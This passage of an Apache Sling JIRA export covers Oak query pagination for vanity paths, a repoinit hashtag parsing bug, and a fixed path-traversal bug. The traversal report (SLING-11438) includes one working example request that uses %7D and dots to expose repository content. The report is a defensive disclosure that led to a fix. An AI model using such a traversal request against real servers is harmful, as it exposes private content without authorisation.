                            <comment id="17564259" author="tmueller" created="Fri, 8 Jul 2022 12:11:18 +0000"  >&lt;p&gt;A good page size for this use case would be 1000. 10&apos;000 would work as well, but I doubt that it would be any faster (you can try).&lt;/p&gt;

&lt;p&gt;&amp;gt; Do we have any real-world example of code using this feature yet?&lt;/p&gt;

&lt;p&gt;Internally, inside Oak, we use variable page sizes for Lucene indexes (since many years now). First we load 50 (LUCENE_QUERY_BATCH_SIZE), then twice that much, up to some limit. But the use case is a bit different: we don&apos;t know how many we really need, so we start with 50. &lt;/p&gt;

&lt;p&gt;Your use case is: you always need all entries. So starting with a batch size of 50 and then increasing is not needed.&lt;/p&gt;</comment>
                            <comment id="17564262" author="reschke" created="Fri, 8 Jul 2022 12:18:46 +0000"  >&lt;p&gt;My concern is that whatever page size I pick, it might break because&lt;/p&gt;

&lt;p&gt;1. the query limit might be configured smaller, or&lt;br/&gt;
2. the page size is smaller than the number of search results sharing the same vanity path&lt;/p&gt;

&lt;p&gt;Both are edge cases, but I would feel better if I could write more robust code.&lt;/p&gt;</comment>
                            <comment id="17564278" author="reschke" created="Fri, 8 Jul 2022 12:54:15 +0000"  >&lt;p&gt;Ok, this one&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;select * from [nt:base] where [sling:vanityPath] &amp;gt;= &quot;&quot; order by [sling:vanityPath] option (limit 1000)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;seems to work as SQL2 query (and the &quot;&amp;gt;=&quot; would be used to select the query start)&lt;/p&gt;</comment>
                            <comment id="17564308" author="tmueller" created="Fri, 8 Jul 2022 14:50:32 +0000"  >&lt;p&gt;&amp;gt; the query limit might be configured smaller&lt;/p&gt;

&lt;p&gt;Currently the query limit is 100&apos;000. I wouldn&apos;t know of a valid reason to configure a value below 1000. I recommend that we also test with 10&apos;000 and see if that&apos;s faster. If it&apos;s much faster, then we can consider using 10&apos;000 as well.&lt;/p&gt;

&lt;p&gt;&amp;gt; the page size is smaller than the number of search results sharing the same vanity path&lt;/p&gt;

&lt;p&gt;I think the query should be:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;select [sling:vanityPath], [sling:redirect], [sling:redirectStatus] from [nt:base]
where first([sling:vanityPath]) &amp;gt;= $lastEntry
order by first([sling:vanityPath]), [jcr:path]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That way, even if we have more than 1000 entries for the same vanity path, and the limit is smaller than 1000, it would work fine. BUT you need to make sure you don&apos;t use &quot;limit 1000&quot;, and read all the entries for a given value.&lt;/p&gt;

&lt;p&gt;&amp;gt; option (limit 1000)&lt;/p&gt;

&lt;p&gt;This is not actually needed. Instead, we can iterate over the result, counting the entries in the loop itself, and stop when needed. E.g.&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;lastEntry = &quot;&quot;;
while (true) {
    it = query(&quot;select [sling:vanityPath], [sling:redirect], [sling:redirectStatus] &quot; + 
        &quot;from [nt:base] where first([sling:vanityPath]) &amp;gt;= $lastEntry &quot; +
        &quot;order by first([sling:vanityPath]), [jcr:path]&quot;, lastEntry);
    for (int i = 0; it.hasNext(); i++) {
        String x = it.next().get(&quot;[sling:vanityPath]&quot;);
        if (i &amp;gt; 1000 &amp;amp;&amp;amp; !x.equals(lastEntry)) {
            // next page
            lastEntry = x;
            break;
        }
        ... remember x (in the Bloom filter) ...
    }
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;BTW we need &quot;first(..)&quot; because sling:vanityPath can be a multi-valued property.&lt;/p&gt;</comment>
                            <comment id="17579642" author="reschke" created="Mon, 15 Aug 2022 11:13:50 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thomasm&quot; class=&quot;user-hover&quot; rel=&quot;thomasm&quot;&gt;thomasm&lt;/a&gt;, re:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;I think the query should be:

select [sling:vanityPath], [sling:redirect], [sling:redirectStatus] from [nt:base]
where first([sling:vanityPath]) &amp;gt;= $lastEntry
order by first([sling:vanityPath]), [jcr:path]

That way, even if we have more than 1000 entries for the same vanity path, and the limit is smaller than 1000, it would work fine. BUT you need to make sure you don&apos;t use &quot;limit 1000&quot;, and read all the entries for a given value.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Can you explain how adding jcr:path to the query helps? How would I use that when restarting the query?&lt;/p&gt;</comment>
                            <comment id="17580357" author="tmueller" created="Tue, 16 Aug 2022 14:58:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; hm... now that I think about it again... if processing the same entry multiple times is not a problem, then I think the sorting by jcr:path is not needed. Also, you don&apos;t need to count the entries. &lt;/p&gt;

&lt;p&gt;I&apos;m sorry I kind of blindly copied the query from here&lt;br/&gt;
&lt;a href=&quot;https://jackrabbit.apache.org/oak/docs/query/query-engine.html#keyset-pagination&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://jackrabbit.apache.org/oak/docs/query/query-engine.html#keyset-pagination&lt;/a&gt;&lt;br/&gt;
but didn&apos;t think that this here doesn&apos;t apply: &quot;If your application requires that the same node is only processed once, then additional logic is required to skip over the entries already seen (for the same xyz).&quot;&lt;/p&gt;

&lt;p&gt;In your case, you can start with the last sling:vanityPath already processed, and don&apos;t need to skip over any entries, as adding them again to the Bloom filter is not an issue.&lt;/p&gt;

&lt;p&gt;If you need an accurate count of entries, then some additional logic is needed, but even that doesn&apos;t need order by jcr:path.&lt;/p&gt;</comment>
                            <comment id="17601815" author="reschke" created="Thu, 8 Sep 2022 13:08:33 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=thomasm&quot; class=&quot;user-hover&quot; rel=&quot;thomasm&quot;&gt;thomasm&lt;/a&gt; re &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11439?focusedCommentId=17564308&amp;amp;page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-17564308:&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/SLING-11439?focusedCommentId=17564308&amp;amp;page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-17564308:&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;This is not actually needed. Instead, we can iterate over the result, counting the entries in the loop itself, and stop when needed. E.g.

lastEntry = &quot;&quot;;
while (true) {
    it = query(&quot;select [sling:vanityPath], [sling:redirect], [sling:redirectStatus] &quot; + 
        &quot;from [nt:base] where first([sling:vanityPath]) &amp;gt;= $lastEntry &quot; +
        &quot;order by first([sling:vanityPath]), [jcr:path]&quot;, lastEntry);
    for (int i = 0; it.hasNext(); i++) {
        String x = it.next().get(&quot;[sling:vanityPath]&quot;);
        if (i &amp;gt; 1000 &amp;amp;&amp;amp; !x.equals(lastEntry)) {
            // next page
            lastEntry = x;
            break;
        }
        ... remember x (in the Bloom filter) ...
    }
}

BTW we need &quot;first(..)&quot; because sling:vanityPath can be a multi-valued property.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That doesn&apos;t seem to work. In my test I see that org.apache.jackrabbit.oak.query.RuntimeNodeTraversalException is thrown on getting the iterator for the query result:&lt;/p&gt;

 &lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;08.09.2022 14:19:38.945 *ERROR* [FelixDispatchQueue] org.apache.sling.resourceresolver.impl.CommonResourceResolverFactoryImpl activate: Cannot access repository, failed setting up Mapping Support
org.apache.jackrabbit.oak.query.RuntimeNodeTraversalException: The query read or traversed more than 100000 nodes. To avoid affecting other tasks, processing was stopped.
        at org.apache.jackrabbit.oak.query.FilterIterators.checkReadLimit(FilterIterators.java:70) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.plugins.index.property.strategy.ContentMirrorStoreStrategy$PathIterator.fetchNextPossiblyDuplicate(ContentMirrorStoreStrategy.java:459) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.plugins.index.property.strategy.ContentMirrorStoreStrategy$PathIterator.fetchNext(ContentMirrorStoreStrategy.java:402) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.plugins.index.property.strategy.ContentMirrorStoreStrategy$PathIterator.next(ContentMirrorStoreStrategy.java:488) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.plugins.index.property.strategy.ContentMirrorStoreStrategy$PathIterator.next(ContentMirrorStoreStrategy.java:338) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at com.google.common.collect.Iterators$5.next(Iterators.java:553) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.TransformedIterator.next(TransformedIterator.java:48) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.TransformedIterator.next(TransformedIterator.java:48) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.Iterators$7.computeNext(Iterators.java:646) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:143) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:138) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.TransformedIterator.hasNext(TransformedIterator.java:43) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.Iterators$5.hasNext(Iterators.java:542) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at org.apache.jackrabbit.oak.plugins.index.search.spi.query.FulltextIndex$FulltextPathCursor$1.hasNext(FulltextIndex.java:419) [org.apache.jackrabbit.oak-lucene:1.44.0.T20220901123248-ccd9028]
        at com.google.common.collect.Iterators$7.computeNext(Iterators.java:645) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:143) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:138) [com.adobe.granite.osgi.wrapper.guava:15.0.0.0002]
        at org.apache.jackrabbit.oak.plugins.index.cursor.PathCursor.hasNext(PathCursor.java:70) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.plugins.index.search.spi.query.FulltextIndex$FulltextPathCursor.hasNext(FulltextIndex.java:452) [org.apache.jackrabbit.oak-lucene:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.ast.SelectorImpl.nextInternal(SelectorImpl.java:529) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.ast.SelectorImpl.next(SelectorImpl.java:522) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.QueryImpl$RowIterator.fetchNext(QueryImpl.java:933) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.QueryImpl$RowIterator.hasNext(QueryImpl.java:960) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.FilterIterators$SortIterator.init(FilterIterators.java:207) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.FilterIterators$SortIterator.hasNext(FilterIterators.java:241) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.QueryImpl.getRows(QueryImpl.java:631) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.query.ResultImpl$1.iterator(ResultImpl.java:72) [org.apache.jackrabbit.oak-core:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.jcr.query.QueryResultImpl$4.&amp;lt;init&amp;gt;(QueryResultImpl.java:177) [org.apache.jackrabbit.oak-jcr:1.44.0.T20220901123248-ccd9028]
        at org.apache.jackrabbit.oak.jcr.query.QueryResultImpl.getNodes(QueryResultImpl.java:174) [org.apache.jackrabbit.oak-jcr:1.44.0.T20220901123248-ccd9028]
        at org.apache.sling.jcr.resource.internal.helper.jcr.BasicQueryLanguageProvider.findResources(BasicQueryLanguageProvider.java:83) [org.apache.sling.jcr.resource:3.2.0]
        at org.apache.sling.resourceresolver.impl.providers.stateful.AuthenticatedResourceProvider.findResources(AuthenticatedResourceProvider.java:285) [org.apache.sling.resourceresolver:1.10.1.SNAPSHOT]
        at org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl.findResources(ResourceResolverControl.java:574) [org.apache.sling.resourceresolver:1.10.1.SNAPSHOT]
        at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.findResources(ResourceResolverImpl.java:574) [org.apache.sling.resourceresolver:1.10.1.SNAPSHOT]
        at org.apache.sling.resourceresolver.impl.mapping.MapEntries.queryAllVanityPaths(MapEntries.java:1282) [org.apache.sling.resourceresolver:1.10.1.SNAPSHOT]
 &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So it&apos;s not possible just to read a &quot;small&quot; number of results, and then to restart the query. &lt;/p&gt;</comment>
                            <comment id="17601848" author="reschke" created="Thu, 8 Sep 2022 14:25:50 +0000"  >&lt;p&gt;I now tried&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;SELECT [sling:vanityPath], [sling:redirect], [sling:redirectStatus] FROM [nt:base] WHERE NOT isdescendantnode(&apos;/jcr:system&apos;) AND [sling:vanityPath] IS NOT NULL ORDER BY FIRST([sling:vanityPath]), [jcr:path] OPTION (LIMIT 1000)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;on a repo with &amp;gt; 100K vanity paths, and I&apos;m still getting the same exception:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;08.09.2022 16:17:53.133 *DEBUG* [Background Update org.apache.sling.resourceresolver (183)] org.apache.sling.resourceresolver.impl.mapping.MapEntries start vanityPath query: SELECT [sling:vanityPath], [sling:redirect], [sling:redirectStatus] FROM [nt:base] WHERE NOT isdescendantnode(&apos;/jcr:system&apos;) AND [sling:vanityPath] IS NOT NULL ORDER BY FIRST([sling:vanityPath]), [jcr:path] OPTION (LIMIT 1000)
08.09.2022 16:17:57.525 *DEBUG* [Background Update org.apache.sling.resourceresolver (183)] org.apache.sling.resourceresolver.impl.mapping.MapEntries dropping temporary resolver map - 0/10000 entries, 0 hits, 0 misses
08.09.2022 16:17:57.525 *ERROR* [Background Update org.apache.sling.resourceresolver (183)] org.apache.sling.resourceresolver.impl.CommonResourceResolverFactoryImpl activate: Cannot access repository, failed setting up Mapping Support
org.apache.jackrabbit.oak.query.RuntimeNodeTraversalException: The query read or traversed more than 100000 nodes. To avoid affecting other tasks, processing was stopped.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What am I doing wrong?&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13480847">OAK-9929</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 6 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16njc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11438] Resource path consisting of %7D with multiple dots leads to path traversal</title>
                <link>https://issues.apache.org/jira/browse/SLING-11438</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;With changes of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10225&quot; title=&quot;Files with &amp;quot;..&amp;quot; In Name Throw 400 Exception&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10225&quot;&gt;&lt;del&gt;SLING-10225&lt;/del&gt;&lt;/a&gt;, sling-engine started considering requests consisting of resource path with %5B ([) and multiple dots as &quot;Invalid&quot;, as it could lead to path traversal and exposure of repository content.&lt;/p&gt;

&lt;p&gt;But same could happen with %7D (}) with multiple dots in the request resource path.&lt;/p&gt;

&lt;p&gt;e.g: http://&amp;lt;HOST&amp;gt;:&amp;lt;PORT&amp;gt;/content/we-retail/us/en/experience.html/.%7D./.%7D./.1.json would lead to exposure of repository content stored at /content/we-retail/us&lt;/p&gt;</description>
                <environment></environment>
        <key id="13470285">SLING-11438</key>
            <summary>Resource path consisting of %7D with multiple dots leads to path traversal</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="karlpauls">Karl Pauls</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Wed, 6 Jul 2022 08:26:30 +0000</created>
                <updated>Mon, 18 Jul 2022 12:12:40 +0000</updated>
                            <resolved>Wed, 13 Jul 2022 09:42:57 +0000</resolved>
                                    <version>Engine 2.9.0</version>
                                    <fixVersion>Engine 2.9.2</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="7800">2h 10m</timespent>
                                <comments>
                            <comment id="17563058" author="sagarmiglani" created="Wed, 6 Jul 2022 08:33:12 +0000"  >&lt;p&gt;Potential fix: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/pull/23&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/pull/23&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17566236" author="karlpauls" created="Wed, 13 Jul 2022 09:42:57 +0000"  >&lt;p&gt;Thanks a lot &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt;, I merged your PR.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 15 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16n3k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11427] Registering a Namespace does not allow Hashtag in the URI</title>
                <link>https://issues.apache.org/jira/browse/SLING-11427</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Registering a Namespace in the repoinit fails when the URI contains a hashtag:&lt;br/&gt;
Example:&lt;/p&gt;

&lt;p&gt;register namespace (stDim) &lt;a href=&quot;http://ns.adobe.com/xap/1.0/sType/Dimensions#&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://ns.adobe.com/xap/1.0/sType/Dimensions#&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This should work or support an escape of the hashtag (&amp;lt;backslash&amp;gt;#):&lt;/p&gt;

&lt;p&gt;register namespace (stDim) &lt;a href=&quot;http://ns.adobe.com/xap/1.0/sType/Dimensions#&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://ns.adobe.com/xap/1.0/sType/Dimensions\\#&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13469230">SLING-11427</key>
            <summary>Registering a Namespace does not allow Hashtag in the URI</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="andysch">Andreas Schaefer</reporter>
                        <labels>
                    </labels>
                <created>Wed, 29 Jun 2022 17:24:16 +0000</created>
                <updated>Mon, 11 Jul 2022 18:52:52 +0000</updated>
                            <resolved>Tue, 5 Jul 2022 17:30:52 +0000</resolved>
                                    <version>Repoinit Parser 1.6.4</version>
                                    <fixVersion>Repoinit Parser 1.7.0</fixVersion>
                                    <component>Repoinit</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="9000">2.5h</timespent>
                                <comments>
                            <comment id="17560672" author="schaefa" created="Wed, 29 Jun 2022 22:45:54 +0000"  >&lt;p&gt;Adding this line to the end of test-40.txt:&lt;/p&gt;

&lt;p&gt;register namespace (foo2) uri:some-uri/V/1.0/test#&lt;br/&gt;
Is missing the output:&lt;/p&gt;

&lt;p&gt;RegisterNamespace (foo2) uri:some-uri/V/1.0/test#&lt;/p&gt;

&lt;p&gt;Adding this:&lt;/p&gt;

&lt;p&gt;register namespace (foo2) uri:some-uri/V/1.0/test&amp;#35;&lt;/p&gt;

&lt;p&gt;is yielding a parser exception:&lt;/p&gt;

&lt;p&gt;Caused by: org.apache.sling.repoinit.parser.impl.TokenMgrError: Lexical error at line 4, column 50.&#160; Encountered: &quot;&lt;br class=&quot;atl-forced-newline&quot; /&gt;&quot; (92), after : &quot;&quot;&lt;/p&gt;

&lt;p&gt;at org.apache.sling.repoinit.parser.impl.RepoInitParserImplTokenManager.getNextToken(RepoInitParserImplTokenManager.java:1200)&lt;/p&gt;



&lt;p&gt;I am not a Javacc expert and so my attempts to rectify this issue failed.&#160;&lt;/p&gt;</comment>
                            <comment id="17560684" author="schaefa" created="Wed, 29 Jun 2022 23:52:32 +0000"  >&lt;p&gt;I created a simple &apos;fix&apos; for that on this PR: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-repoinit-parser/pull/24&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-repoinit-parser/pull/24&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17562769" author="schaefa" created="Tue, 5 Jul 2022 17:30:52 +0000"  >&lt;p&gt;A fix was created in PR #24, approved and merged into master&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
